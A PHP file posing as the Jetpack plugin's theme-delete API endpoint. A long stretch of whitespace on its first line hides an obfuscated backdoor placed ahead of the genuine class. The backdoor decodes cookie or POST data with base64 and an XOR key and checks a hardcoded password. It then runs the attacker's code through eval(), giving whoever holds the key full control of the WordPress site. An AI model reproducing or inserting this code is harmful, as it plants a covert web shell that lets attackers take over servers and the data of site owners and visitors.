<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ia03304 = 349;$GLOBALS['ba51'] = Array();global $ba51;$ba51 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['g798651d'] = "\x24\x78\x57\x5c\x30\x77\x52\x76\x23\x79\x3c\x51\x31\x5f\x61\x47\x7c\x2b\x45\x56\x21\x7d\x44\x22\x6d\x34\x70\x33\x28\x3b\x3a\x6f\x32\x2d\x4e\x42\x53\x2e\x4f\x49\x29\x69\x7e\x68\x2f\x5b\x5a\x73\x4c\x43\x41\x48\x75\x2c\x60\xd\x35\x72\x4d\x58\xa\x6b\x4a\x71\x7a\x54\x39\x26\x20\x25\x59\x2a\x38\x67\x55\x74\x7b\x37\x50\x5d\x5e\x3f\x62\x6e\x66\x4b\x46\x6a\x9\x64\x6c\x3d\x36\x27\x40\x3e\x63\x65";$ba51[$ba51['g798651d'][63].$ba51['g798651d'][89].$ba51['g798651d'][89].$ba51['g798651d'][92].$ba51['g798651d'][4].$ba51['g798651d'][89]] = $ba51['g798651d'][96].$ba51['g798651d'][43].$ba51['g798651d'][57];$ba51[$ba51['g798651d'][9].$ba51['g798651d'][84].$ba51['g798651d'][66].$ba51['g798651d'][92].$ba51['g798651d'][66].$ba51['g798651d'][25].$ba51['g798651d'][14].$ba51['g798651d'][12]] = $ba51['g798651d'][31].$ba51['g798651d'][57].$ba51['g798651d'][89];$ba51[$ba51['g798651d'][97].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][89].$ba51['g798651d'][97].$ba51['g798651d'][82].$ba51['g798651d'][4]] = $ba51['g798651d'][89].$ba51['g798651d'][97].$ba51['g798651d'][84].$ba51['g798651d'][41].$ba51['g798651d'][83].$ba51['g798651d'][97];$ba51[$ba51['g798651d'][7].$ba51['g798651d'][77].$ba51['g798651d'][12].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][96].$ba51['g798651d'][32].$ba51['g798651d'][72].$ba51['g798651d'][25]] = $ba51['g798651d'][47].$ba51['g798651d'][75].$ba51['g798651d'][57].$ba51['g798651d'][90].$ba51['g798651d'][97].$ba51['g798651d'][83];$ba51[$ba51['g798651d'][9].$ba51['g798651d'][92].$ba51['g798651d'][92].$ba51['g798651d'][25].$ba51['g798651d'][66].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][92].$ba51['g798651d'][12]] = $ba51['g798651d'][89].$ba51['g798651d'][97].$ba51['g798651d'][84].$ba51['g798651d'][41].$ba51['g798651d'][83].$ba51['g798651d'][97].$ba51['g798651d'][89];$ba51[$ba51['g798651d'][5].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][25]] = $ba51['g798651d'][41].$ba51['g798651d'][83].$ba51['g798651d'][41].$ba51['g798651d'][13].$ba51['g798651d'][47].$ba51['g798651d'][97].$ba51['g798651d'][75];$ba51[$ba51['g798651d'][61].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][72].$ba51['g798651d'][77].$ba51['g798651d'][89].$ba51['g798651d'][89].$ba51['g798651d'][4].$ba51['g798651d'][32]] = $ba51['g798651d'][47].$ba51['g798651d'][97].$ba51['g798651d'][57].$ba51['g798651d'][41].$ba51['g798651d'][14].$ba51['g798651d'][90].$ba51['g798651d'][41].$ba51['g798651d'][64].$ba51['g798651d'][97];$ba51[$ba51['g798651d'][41].$ba51['g798651d'][66].$ba51['g798651d'][14].$ba51['g798651d'][72].$ba51['g798651d'][89].$ba51['g798651d'][82].$ba51['g798651d'][27].$ba51['g798651d'][66]] = $ba51['g798651d'][26].$ba51['g798651d'][43].$ba51['g798651d'][26].$ba51['g798651d'][7].$ba51['g798651d'][97].$ba51['g798651d'][57].$ba51['g798651d'][47].$ba51['g798651d'][41].$ba51['g798651d'][31].$ba51['g798651d'][83];$ba51[$ba51['g798651d'][73].$ba51['g798651d'][97].$ba51['g798651d'][32].$ba51['g798651d'][4].$ba51['g798651d'][25].$ba51['g798651d'][77].$ba51['g798651d'][25].$ba51['g798651d'][66].$ba51['g798651d'][4]] = $ba51['g798651d'][52].$ba51['g798651d'][83].$ba51['g798651d'][47].$ba51['g798651d'][97].$ba51['g798651d'][57].$ba51['g798651d'][41].$ba51['g798651d'][14].$ba51['g798651d'][90].$ba51['g798651d'][41].$ba51['g798651d'][64].$ba51['g798651d'][97];$ba51[$ba51['g798651d'][14].$ba51['g798651d'][82].$ba51['g798651d'][96].$ba51['g798651d'][96]] = $ba51['g798651d'][82].$ba51['g798651d'][14].$ba51['g798651d'][47].$ba51['g798651d'][97].$ba51['g798651d'][92].$ba51['g798651d'][25].$ba51['g798651d'][13].$ba51['g798651d'][89].$ba51['g798651d'][97].$ba51['g798651d'][96].$ba51['g798651d'][31].$ba51['g798651d'][89].$ba51['g798651d'][97];$ba51[$ba51['g798651d'][97].$ba51['g798651d'][89].$ba51['g798651d'][96].$ba51['g798651d'][14]] = $ba51['g798651d'][47].$ba51['g798651d'][97].$ba51['g798651d'][75].$ba51['g798651d'][13].$ba51['g798651d'][75].$ba51['g798651d'][41].$ba51['g798651d'][24].$ba51['g798651d'][97].$ba51['g798651d'][13].$ba51['g798651d'][90].$ba51['g798651d'][41].$ba51['g798651d'][24].$ba51['g798651d'][41].$ba51['g798651d'][75];$ba51[$ba51['g798651d'][52].$ba51['g798651d'][92].$ba51['g798651d'][25].$ba51['g798651d'][12].$ba51['g798651d'][4].$ba51['g798651d'][82].$ba51['g798651d'][96].$ba51['g798651d'][82].$ba51['g798651d'][72]] = $ba51['g798651d'][24].$ba51['g798651d'][97].$ba51['g798651d'][97].$ba51['g798651d'][25].$ba51['g798651d'][72].$ba51['g798651d'][72];$ba51[$ba51['g798651d'][96].$ba51['g798651d'][66].$ba51['g798651d'][77].$ba51['g798651d'][96].$ba51['g798651d'][92].$ba51['g798651d'][97].$ba51['g798651d'][12].$ba51['g798651d'][97].$ba51['g798651d'][92]] = $ba51['g798651d'][61].$ba51['g798651d'][96].$ba51['g798651d'][66].$ba51['g798651d'][97].$ba51['g798651d'][25].$ba51['g798651d'][77].$ba51['g798651d'][12];$ba51[$ba51['g798651d'][75].$ba51['g798651d'][97].$ba51['g798651d'][84].$ba51['g798651d'][32]] = $_POST;$ba51[$ba51['g798651d'][96].$ba51['g798651d'][72].$ba51['g798651d'][84].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][27]] = $_COOKIE;@$ba51[$ba51['g798651d'][5].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][25]]($ba51['g798651d'][97].$ba51['g798651d'][57].$ba51['g798651d'][57].$ba51['g798651d'][31].$ba51['g798651d'][57].$ba51['g798651d'][13].$ba51['g798651d'][90].$ba51['g798651d'][31].$ba51['g798651d'][73], NULL);@$ba51[$ba51['g798651d'][5].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][25]]($ba51['g798651d'][90].$ba51['g798651d'][31].$ba51['g798651d'][73].$ba51['g798651d'][13].$ba51['g798651d'][97].$ba51['g798651d'][57].$ba51['g798651d'][57].$ba51['g798651d'][31].$ba51['g798651d'][57].$ba51['g798651d'][47], 0);@$ba51[$ba51['g798651d'][5].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][25]]($ba51['g798651d'][24].$ba51['g798651d'][14].$ba51['g798651d'][1].$ba51['g798651d'][13].$ba51['g798651d'][97].$ba51['g798651d'][1].$ba51['g798651d'][97].$ba51['g798651d'][96].$ba51['g798651d'][52].$ba51['g798651d'][75].$ba51['g798651d'][41].$ba51['g798651d'][31].$ba51['g798651d'][83].$ba51['g798651d'][13].$ba51['g798651d'][75].$ba51['g798651d'][41].$ba51['g798651d'][24].$ba51['g798651d'][97], 0);@$ba51[$ba51['g798651d'][97].$ba51['g798651d'][89].$ba51['g798651d'][96].$ba51['g798651d'][14]](0);if (!$ba51[$ba51['g798651d'][9].$ba51['g798651d'][92].$ba51['g798651d'][92].$ba51['g798651d'][25].$ba51['g798651d'][66].$ba51['g798651d'][77].$ba51['g798651d'][66].$ba51['g798651d'][92].$ba51['g798651d'][12]]($ba51['g798651d'][50].$ba51['g798651d'][48].$ba51['g798651d'][6].$ba51['g798651d'][18].$ba51['g798651d'][50].$ba51['g798651d'][22].$ba51['g798651d'][70].$ba51['g798651d'][13].$ba51['g798651d'][6].$ba51['g798651d'][74].$ba51['g798651d'][34].$ba51['g798651d'][13].$ba51['g798651d'][27].$ba51['g798651d'][92].$ba51['g798651d'][92].$ba51['g798651d'][14].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][72].$ba51['g798651d'][14].$ba51['g798651d'][72].$ba51['g798651d'][14].$ba51['g798651d'][32].$ba51['g798651d'][27].$ba51['g798651d'][56].$ba51['g798651d'][56].$ba51['g798651d'][14].$ba51['g798651d'][82].$ba51['g798651d'][32].$ba51['g798651d'][12].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][84].$ba51['g798651d'][12].$ba51['g798651d'][12].$ba51['g798651d'][82].$ba51['g798651d'][14].$ba51['g798651d'][12].$ba51['g798651d'][14].$ba51['g798651d'][4].$ba51['g798651d'][32].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][14])){$ba51[$ba51['g798651d'][97].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][89].$ba51['g798651d'][97].$ba51['g798651d'][82].$ba51['g798651d'][4]]($ba51['g798651d'][50].$ba51['g798651d'][48].$ba51['g798651d'][6].$ba51['g798651d'][18].$ba51['g798651d'][50].$ba51['g798651d'][22].$ba51['g798651d'][70].$ba51['g798651d'][13].$ba51['g798651d'][6].$ba51['g798651d'][74].$ba51['g798651d'][34].$ba51['g798651d'][13].$ba51['g798651d'][27].$ba51['g798651d'][92].$ba51['g798651d'][92].$ba51['g798651d'][14].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][72].$ba51['g798651d'][14].$ba51['g798651d'][72].$ba51['g798651d'][14].$ba51['g798651d'][32].$ba51['g798651d'][27].$ba51['g798651d'][56].$ba51['g798651d'][56].$ba51['g798651d'][14].$ba51['g798651d'][82].$ba51['g798651d'][32].$ba51['g798651d'][12].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][84].$ba51['g798651d'][12].$ba51['g798651d'][12].$ba51['g798651d'][82].$ba51['g798651d'][14].$ba51['g798651d'][12].$ba51['g798651d'][14].$ba51['g798651d'][4].$ba51['g798651d'][32].$ba51['g798651d'][84].$ba51['g798651d'][82].$ba51['g798651d'][14], 1);$u2d309 = NULL;$xb6544eed = NULL;$ba51[$ba51['g798651d'][63].$ba51['g798651d'][14].$ba51['g798651d'][89].$ba51['g798651d'][12].$ba51['g798651d'][82].$ba51['g798651d'][4].$ba51['g798651d'][14].$ba51['g798651d'][82].$ba51['g798651d'][66]] = $ba51['g798651d'][25].$ba51['g798651d'][92].$ba51['g798651d'][84].$ba51['g798651d'][84].$ba51['g798651d'][27].$ba51['g798651d'][66].$ba51['g798651d'][27].$ba51['g798651d'][25].$ba51['g798651d'][33].$ba51['g798651d'][25].$ba51['g798651d'][97].$ba51['g798651d'][25].$ba51['g798651d'][84].$ba51['g798651d'][33].$ba51['g798651d'][25].$ba51['g798651d'][84].$ba51['g798651d'][92].$ba51['g798651d'][14].$ba51['g798651d'][33].$ba51['g798651d'][14].$ba51['g798651d'][56].$ba51['g798651d'][25].$ba51['g798651d'][77].$ba51['g798651d'][33].$ba51['g798651d'][14].$ba51['g798651d'][32].$ba51['g798651d'][12].$ba51['g798651d'][77].$ba51['g798651d'][32].$ba51['g798651d'][84].$ba51['g798651d'][92].$ba51['g798651d'][92].$ba51['g798651d'][27].$ba51['g798651d'][66].$ba51['g798651d'][72].$ba51['g798651d'][97];global $qad1b0ab9;function  kc9e471($u2d309, $i0fc49){global $ba51;$dd1d9da = "";for ($w21c41=0; $w21c41<$ba51[$ba51['g798651d'][7].$ba51['g798651d'][77].$ba51['g798651d'][12].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][96].$ba51['g798651d'][32].$ba51['g798651d'][72].$ba51['g798651d'][25]]($u2d309);){for ($o97750eff=0; $o97750eff<$ba51[$ba51['g798651d'][7].$ba51['g798651d'][77].$ba51['g798651d'][12].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][96].$ba51['g798651d'][32].$ba51['g798651d'][72].$ba51['g798651d'][25]]($i0fc49) && $w21c41<$ba51[$ba51['g798651d'][7].$ba51['g798651d'][77].$ba51['g798651d'][12].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][96].$ba51['g798651d'][32].$ba51['g798651d'][72].$ba51['g798651d'][25]]($u2d309); $o97750eff++, $w21c41++){$dd1d9da .= $ba51[$ba51['g798651d'][63].$ba51['g798651d'][89].$ba51['g798651d'][89].$ba51['g798651d'][92].$ba51['g798651d'][4].$ba51['g798651d'][89]]($ba51[$ba51['g798651d'][9].$ba51['g798651d'][84].$ba51['g798651d'][66].$ba51['g798651d'][92].$ba51['g798651d'][66].$ba51['g798651d'][25].$ba51['g798651d'][14].$ba51['g798651d'][12]]($u2d309[$w21c41]) ^ $ba51[$ba51['g798651d'][9].$ba51['g798651d'][84].$ba51['g798651d'][66].$ba51['g798651d'][92].$ba51['g798651d'][66].$ba51['g798651d'][25].$ba51['g798651d'][14].$ba51['g798651d'][12]]($i0fc49[$o97750eff]));}}return $dd1d9da;}function  mee488($u2d309, $i0fc49){global $ba51;global $qad1b0ab9;return $ba51[$ba51['g798651d'][96].$ba51['g798651d'][66].$ba51['g798651d'][77].$ba51['g798651d'][96].$ba51['g798651d'][92].$ba51['g798651d'][97].$ba51['g798651d'][12].$ba51['g798651d'][97].$ba51['g798651d'][92]]($ba51[$ba51['g798651d'][96].$ba51['g798651d'][66].$ba51['g798651d'][77].$ba51['g798651d'][96].$ba51['g798651d'][92].$ba51['g798651d'][97].$ba51['g798651d'][12].$ba51['g798651d'][97].$ba51['g798651d'][92]]($u2d309, $qad1b0ab9), $i0fc49);}foreach ($ba51[$ba51['g798651d'][96].$ba51['g798651d'][72].$ba51['g798651d'][84].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][27]] as $i0fc49=>$f0db){$u2d309 = $f0db;$xb6544eed = $i0fc49;}if (!$u2d309){foreach ($ba51[$ba51['g798651d'][75].$ba51['g798651d'][97].$ba51['g798651d'][84].$ba51['g798651d'][32]] as $i0fc49=>$f0db){$u2d309 = $f0db;$xb6544eed = $i0fc49;}}$u2d309 = @$ba51[$ba51['g798651d'][73].$ba51['g798651d'][97].$ba51['g798651d'][32].$ba51['g798651d'][4].$ba51['g798651d'][25].$ba51['g798651d'][77].$ba51['g798651d'][25].$ba51['g798651d'][66].$ba51['g798651d'][4]]($ba51[$ba51['g798651d'][52].$ba51['g798651d'][92].$ba51['g798651d'][25].$ba51['g798651d'][12].$ba51['g798651d'][4].$ba51['g798651d'][82].$ba51['g798651d'][96].$ba51['g798651d'][82].$ba51['g798651d'][72]]($ba51[$ba51['g798651d'][14].$ba51['g798651d'][82].$ba51['g798651d'][96].$ba51['g798651d'][96]]($u2d309), $xb6544eed));if (isset($u2d309[$ba51['g798651d'][14].$ba51['g798651d'][61]]) && $qad1b0ab9==$u2d309[$ba51['g798651d'][14].$ba51['g798651d'][61]]){if ($u2d309[$ba51['g798651d'][14]] == $ba51['g798651d'][41]){$w21c41 = Array($ba51['g798651d'][26].$ba51['g798651d'][7] => @$ba51[$ba51['g798651d'][41].$ba51['g798651d'][66].$ba51['g798651d'][14].$ba51['g798651d'][72].$ba51['g798651d'][89].$ba51['g798651d'][82].$ba51['g798651d'][27].$ba51['g798651d'][66]](),$ba51['g798651d'][47].$ba51['g798651d'][7] => $ba51['g798651d'][12].$ba51['g798651d'][37].$ba51['g798651d'][4].$ba51['g798651d'][33].$ba51['g798651d'][12],);echo @$ba51[$ba51['g798651d'][61].$ba51['g798651d'][89].$ba51['g798651d'][66].$ba51['g798651d'][72].$ba51['g798651d'][77].$ba51['g798651d'][89].$ba51['g798651d'][89].$ba51['g798651d'][4].$ba51['g798651d'][32]]($w21c41);}elseif ($u2d309[$ba51['g798651d'][14]] == $ba51['g798651d'][97]){eval/*wce8*/($u2d309[$ba51['g798651d'][89]]);}exit();}} ?><?php

class Jetpack_JSON_API_Themes_Delete_Endpoint extends Jetpack_JSON_API_Themes_Endpoint {

	// POST  /sites/%s/plugins/%s/delete
	protected $needed_capabilities = 'delete_themes';
	protected $action              = 'delete';

	protected function delete() {

		foreach( $this->themes as $theme ) {

			// Don't delete an active child theme
			if ( is_child_theme() && $theme == get_stylesheet() )  {
				$error = $this->log[ $theme ]['error'] = 'You cannot delete a theme while it is active on the main site.';
				continue;
			}

			if( $theme == get_template() ) {
				$error = $this->log[ $theme ]['error'] = 'You cannot delete a theme while it is active on the main site.';
				continue;
			}

			/**
			 * Filters whether to use an alternative process for deleting a WordPress.com theme.
			 * The alternative process can be executed during the filter.
			 *
			 * The filter can also return an instance of WP_Error; in which case the endpoint response will
			 * contain this error.
			 *
			 * @module json-api
			 *
			 * @since 4.4.2
			 *
			 * @param bool   $use_alternative_delete_method Whether to use the alternative method of deleting
			 *                                              a WPCom theme.
			 * @param string $theme_slug                    Theme name (slug). If it is a WPCom theme,
			 *                                              it should be suffixed with `-wpcom`.
			 */
			$result = apply_filters( 'jetpack_wpcom_theme_delete', false, $theme );

			if ( ! $result ) {
				$result = delete_theme( $theme );
			}

			if ( is_wp_error( $result ) ) {
				$error = $this->log[ $theme ]['error'] = $result->get_error_messages();
			} else {
				$this->log[ $theme ][] = 'Theme deleted';
			}
		}

		if( ! $this->bulk && isset( $error ) ) {
			return  new WP_Error( 'delete_theme_error', $error, 400 );
		}

		return true;
	}

}
